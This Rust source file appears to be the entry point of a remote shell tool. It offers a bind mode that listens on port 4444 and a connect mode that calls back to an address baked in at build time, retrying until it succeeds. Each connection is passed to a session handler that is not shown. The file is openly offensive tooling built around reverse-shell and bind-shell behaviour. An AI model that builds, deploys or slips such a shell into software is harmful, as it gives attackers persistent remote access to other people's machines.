mod common;
use common::handle_session;
use std::env;
use std::io;
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::Duration;

fn connect_and_run(address: &str) -> io::Result<()> {
    let stream = TcpStream::connect(address)?;
    println!("Connected to {}", address);
    handle_session(stream)
}

fn main() -> io::Result<()> {
    let mode = option_env!("CARGO_PKG_METADATA_PRECOMPILED_MODE").unwrap_or("bind");
    let address = option_env!("CARGO_PKG_METADATA_PRECOMPILED_ADDRESS").unwrap_or("127.0.0.1:4444");

    if mode == "bind" || mode == "server" {
        println!("Bind shell: listening on {}...", address);
        let listener = TcpListener::bind(address)?;
        let (stream, addr) = listener.accept()?;
        println!("Client connected from {}", addr);
        handle_session(stream)
    } else if mode == "connect" || mode == "client" {
        let reconnect_interval = env::var("RECONNECT_INTERVAL")
            .ok()
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(5);
        let max_reconnect_attempts = env::var("MAX_RECONNECT_ATTEMPTS")
            .ok()
            .and_then(|s| s.parse::<u32>().ok())
            .unwrap_or(5);

        let mut attempts = 0;
        loop {
            match connect_and_run(address) {
                Ok(_) => {
                    println!("Disconnected normally.");
                    break;
                }
                Err(e) => {
                    eprintln!("Connection error: {}", e);
                    attempts += 1;
                    if attempts >= max_reconnect_attempts {
                        eprintln!("Max reconnect attempts reached. Exiting.");
                        break;
                    }
                    eprintln!(
                        "Reconnecting in {} seconds... (attempt {}/{})",
                        reconnect_interval, attempts, max_reconnect_attempts
                    );
                    thread::sleep(Duration::from_secs(reconnect_interval));
                }
            }
        }
        Ok(())
    } else {
        eprintln!("Unknown mode: {}. Use 'bind' (server) or 'connect' (client).", mode);
        std::process::exit(1);
    }
}
